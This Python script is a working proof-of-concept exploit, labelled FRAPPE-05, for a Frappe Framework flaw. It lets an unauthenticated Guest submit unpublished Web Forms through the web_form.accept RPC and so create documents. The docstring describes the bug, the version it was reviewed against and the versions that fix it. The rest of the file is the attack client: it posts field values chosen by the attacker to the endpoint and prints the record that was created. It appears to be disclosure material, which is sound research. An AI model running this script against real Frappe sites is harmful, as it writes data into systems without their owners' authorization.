#!/usr/bin/env python3
"""Frappe unpublished Web Form submission as Guest (FRAPPE-05).

Frappe's `web_form.accept` RPC inserts a document for any Web Form it can load by
name, without checking that the form is published. An unauthenticated Guest can
therefore submit a Web Form an administrator has unpublished (or never published)
as long as it still allows Guest submission and needs no request key, creating a
document in the underlying DocType. Normal DocType validation and controller
hooks still run.

This client posts the supplied field values straight to `web_form.accept` and
prints the inserted document Frappe returns. Reviewed against Frappe Framework
16.29.0.

Fix status: fixed in Frappe 16.30.0 / 15.117.0, which apply the published check
(raise_if_unpublished) to the Guest Web Form methods.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from typing import Any


ACCEPT_RPC = "/api/method/frappe.website.doctype.web_form.web_form.accept"


class PocError(RuntimeError):
    pass


# --- terminal UI ---
_BANNER = r"""
 _____ ____      _    ____  ____  _____
|  ___|  _ \    / \  |  _ \|  _ \| ____|
| |_  | |_) |  / _ \ | |_) | |_) |  _|
|  _| |  _ <  / ___ \|  __/|  __/| |___
|_|   |_| \_\/_/   \_\_|   |_|   |_____|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def disable_color() -> None:
    global _COLOR
    _COLOR = False


def banner(subtitle: str) -> None:
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg: str) -> None:
    sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")


def good(msg: str) -> None:
    sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")


def warn(msg: str) -> None:
    sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")


def bad(msg: str) -> None:
    sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")


def rule() -> None:
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")
# --- end terminal UI ---


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):  # noqa: ANN001
        return None


class GuestClient:
    def __init__(
        self, url: str, timeout: float, insecure: bool, site: str | None = None
    ) -> None:
        try:
            parsed = urllib.parse.urlsplit(url.strip().rstrip("/"))
            _ = parsed.port
        except ValueError as exc:
            raise PocError(f"invalid --url: {exc}") from exc
        if parsed.scheme not in {"http", "https"} or not parsed.hostname:
            raise PocError("--url must be an http(s) Frappe site URL")
        if parsed.query or parsed.fragment or parsed.username or parsed.password:
            raise PocError("--url must not contain userinfo, a query, or a fragment")
        self.url = urllib.parse.urlunsplit(
            (parsed.scheme, parsed.netloc, parsed.path.rstrip("/"), "", "")
        )
        self.timeout = timeout
        self.site = site
        context = ssl.create_default_context()
        if insecure:
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=context), NoRedirect()
        )

    def request(
        self,
        path: str,
        *,
        method: str = "GET",
        data: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, bytes]:
        default_headers = {
            "Accept": "application/json",
            "Accept-Language": "en",
            "User-Agent": "frappe-05-unpublished-web-form-poc",
        }
        if self.site:
            default_headers["X-Frappe-Site-Name"] = self.site
        request = urllib.request.Request(
            self.url + path,
            data=data,
            headers={**default_headers, **(headers or {})},
            method=method,
        )
        try:
            with self.opener.open(request, timeout=self.timeout) as response:
                return int(response.status), response.read()
        except urllib.error.HTTPError as exc:
            return int(exc.code), exc.read()
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            raise PocError(f"request to {request.full_url} failed: {exc}") from exc


def parse_json(raw: bytes, context: str) -> dict[str, Any]:
    try:
        response = json.loads(raw)
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        raise PocError(f"{context} returned a non-JSON response") from exc
    if not isinstance(response, dict):
        raise PocError(f"{context} returned a JSON value other than an object")
    return response


def response_detail(response: dict[str, Any], raw: bytes) -> str:
    for key in ("exception", "exc_type", "_server_messages", "message"):
        value = response.get(key)
        if isinstance(value, str) and value:
            return value[:500]
    return raw[:500].decode("utf-8", "replace").strip()


def parse_input(raw: str) -> dict[str, Any]:
    try:
        data = json.loads(raw)
    except json.JSONDecodeError as exc:
        raise PocError(f"--data is not valid JSON: {exc.msg}") from exc
    if not isinstance(data, dict):
        raise PocError("--data must be a JSON object")
    if not data:
        raise PocError("--data must contain at least one Web Form field")
    if "name" in data:
        raise PocError("--data must not contain 'name'; this exploit creates a new document")
    return data


def submit(
    client: GuestClient, web_form: str, data: dict[str, Any]
) -> dict[str, Any]:
    body = urllib.parse.urlencode(
        {
            "web_form": web_form,
            "data": json.dumps(data, separators=(",", ":"), ensure_ascii=False),
        }
    ).encode()
    status, raw = client.request(
        ACCEPT_RPC,
        method="POST",
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    response = parse_json(raw, "Web Form submission")
    if status != 200 or response.get("exc") or response.get("exception"):
        raise PocError(
            f"Web Form submission failed with HTTP {status}: {response_detail(response, raw)}"
        )
    created = response.get("message")
    if not isinstance(created, dict) or created.get("__islocal") or not created.get("name"):
        raise PocError("Web Form submission did not return an inserted document")
    return created


def make_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="example:\n"
               "  %(prog)s --url https://frappe.example --web-form unpublished-todo \\\n"
               "    --data '{\"description\":\"Send the revised invoice\"}'\n",
    )
    parser.add_argument("--url", required=True, metavar="URL", help="Frappe site base URL")
    parser.add_argument("--site", metavar="NAME", help="optional X-Frappe-Site-Name value")
    parser.add_argument("--web-form", required=True, metavar="NAME", help="exact Web Form document name")
    parser.add_argument(
        "--data", required=True, metavar="JSON", help="JSON object containing the document field values"
    )
    parser.add_argument("--timeout", type=float, default=15.0, metavar="SECS", help="HTTP timeout (default: 15)")
    parser.add_argument("--insecure", action="store_true", help="disable TLS certificate verification")
    parser.add_argument("--no-color", action="store_true", help="disable coloured output")
    return parser


def run(args: argparse.Namespace) -> int:
    if args.no_color:
        disable_color()
    banner("unpublished Guest Web Form submission  ·  FRAPPE-05")
    if args.timeout <= 0:
        raise PocError("--timeout must be greater than zero")
    if not args.web_form.strip():
        raise PocError("--web-form must not be empty")
    if args.site and not re.fullmatch(r"[A-Za-z0-9._-]+", args.site):
        raise PocError("--site contains an invalid Frappe site name")

    data = parse_input(args.data)
    client = GuestClient(args.url, args.timeout, args.insecure, args.site)
    info(f"submitting Web Form {args.web_form!r} as an unauthenticated Guest")
    created = submit(client, args.web_form, data)
    doctype = created.get("doctype", "document")
    good(f"created {doctype} {created['name']} as Guest")
    rule()
    print(
        json.dumps(
            {
                "web_form": args.web_form,
                "created_document": created,
            },
            indent=2,
            ensure_ascii=False,
        )
    )
    return 0


def main() -> int:
    try:
        return run(make_parser().parse_args())
    except PocError as exc:
        bad(str(exc))
        return 1
    except KeyboardInterrupt:
        bad("interrupted")
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
